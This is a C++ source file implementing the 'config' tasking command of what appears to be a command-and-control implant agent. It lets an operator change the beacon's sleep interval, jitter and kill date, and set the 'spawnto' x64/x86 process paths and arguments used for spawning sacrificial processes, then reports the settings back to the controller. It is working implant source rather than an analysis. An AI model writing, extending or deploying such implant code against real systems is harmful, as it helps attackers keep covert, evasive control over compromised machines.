#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_CONFIG

using namespace stardust;
using namespace starburst;

auto declfn starburst::cmd_config(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t new_sleep    = parser_int32( params );
    uint32_t new_jitter   = parser_int32( params );
    uint32_t new_killdate = parser_int32( params );

    if ( new_sleep != 0xFFFFFFFF ) {
        inst.agent.sleep_ms = new_sleep;
    }
    if ( new_jitter != 0xFFFFFFFF ) {
        inst.agent.jitter_pct = new_jitter;
    }
    if ( new_killdate != 0xFFFFFFFF ) {
        inst.agent.killdate = new_killdate;
    }

    uint32_t s64_len = 0, s64a_len = 0, s86_len = 0, s86a_len = 0;
    auto s64  = parser_string( params, &s64_len );
    auto s64a = parser_string( params, &s64a_len );
    auto s86  = parser_string( params, &s86_len );
    auto s86a = parser_string( params, &s86a_len );

    if ( s64 && s64_len > 0 ) {
        uint32_t n = s64_len < 259 ? s64_len : 259;
        memory::copy( inst.spawnto.x64, s64, n );
        inst.spawnto.x64[n] = '\0';
    }
    if ( s64a && s64a_len > 0 ) {
        uint32_t n = s64a_len < 259 ? s64a_len : 259;
        memory::copy( inst.spawnto.x64_args, s64a, n );
        inst.spawnto.x64_args[n] = '\0';
    }
    if ( s86 && s86_len > 0 ) {
        uint32_t n = s86_len < 259 ? s86_len : 259;
        memory::copy( inst.spawnto.x86, s86, n );
        inst.spawnto.x86[n] = '\0';
    }
    if ( s86a && s86a_len > 0 ) {
        uint32_t n = s86a_len < 259 ? s86a_len : 259;
        memory::copy( inst.spawnto.x86_args, s86a, n );
        inst.spawnto.x86_args[n] = '\0';
    }

    char result[800] = { 0 };
    char tmp[32]     = { 0 };

    str_copy( result, symbol<char*>( const_cast<char*>( "sleep=" ) ) );
    int_to_str( tmp, inst.agent.sleep_ms, 10 );
    str_concat( result, tmp );

    str_concat( result, symbol<char*>( const_cast<char*>( " jitter=" ) ) );
    int_to_str( tmp, inst.agent.jitter_pct, 10 );
    str_concat( result, tmp );

    str_concat( result, symbol<char*>( const_cast<char*>( " killdate=" ) ) );
    int_to_str( tmp, inst.agent.killdate, 10 );
    str_concat( result, tmp );

    str_concat( result, symbol<char*>( const_cast<char*>( "\nspawnto_x64=" ) ) );
    if ( inst.spawnto.x64[0] )
        str_concat( result, inst.spawnto.x64 );
    else
        str_concat( result, symbol<char*>( const_cast<char*>( "(not set)" ) ) );

    if ( inst.spawnto.x64_args[0] ) {
        str_concat( result, symbol<char*>( const_cast<char*>( " " ) ) );
        str_concat( result, inst.spawnto.x64_args );
    }

    str_concat( result, symbol<char*>( const_cast<char*>( "\nspawnto_x86=" ) ) );
    if ( inst.spawnto.x86[0] )
        str_concat( result, inst.spawnto.x86 );
    else
        str_concat( result, symbol<char*>( const_cast<char*>( "(not set)" ) ) );

    if ( inst.spawnto.x86_args[0] ) {
        str_concat( result, symbol<char*>( const_cast<char*>( " " ) ) );
        str_concat( result, inst.spawnto.x86_args );
    }

    queue_response( inst, task_uuid, RESPONSE_SUCCESS, result );
}

#endif
